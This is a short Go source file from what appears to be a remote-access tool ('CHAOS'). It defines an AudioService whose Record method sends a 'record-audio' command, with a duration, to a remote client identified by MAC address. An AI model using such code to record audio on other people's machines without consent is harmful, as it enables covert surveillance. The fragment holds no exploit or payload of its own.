package audio

import (
	"context"
	"fmt"

	"github.com/justadoll/CHAOS/services/client"
)

type AudioService struct {
	client.Service
}

func NewAudioService(clientService client.Service) Service {
	return &AudioService{clientService}
}

func (u AudioService) Record(ctx context.Context, address string, raw_seconds string) error {
	if _, err := u.SendCommand(ctx, client.SendCommandInput{
		MacAddress: address,
		Request:    fmt.Sprintf("record-audio %s", raw_seconds),
	}); err != nil {
		return err
	}
	return nil
}
